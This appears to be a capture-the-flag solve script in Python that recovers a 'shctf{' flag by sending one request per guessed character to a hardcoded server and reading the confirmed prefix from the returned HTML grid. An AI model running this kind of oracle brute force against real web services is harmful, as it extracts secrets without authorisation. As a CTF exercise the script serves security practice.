import requests as rq
import string

URL = 'http://172.105.154.14/'
flag = 'shctf{'


def get_output(res):
    start = b'<div id="grid">\n\n'
    out = res[res.find(start)+len(start):]
    tmp_flag = ''
    for _ in range(25):
        c = chr(out[7])
        if out.find(b'</div>') != 10:
            break
        tmp_flag += c
        out = out[17:]

    return tmp_flag


while not flag.endswith('}'):
    for c in range(0x20, 0x7f):
        c = chr(c)
        print('Trying:', c)
        res = rq.get(URL, params={'flag': flag + c}).content
        tmp_flag = get_output(res)
        print(tmp_flag)
        if len(tmp_flag) > len(flag):
            flag = tmp_flag
            break
    print('flag:', flag)
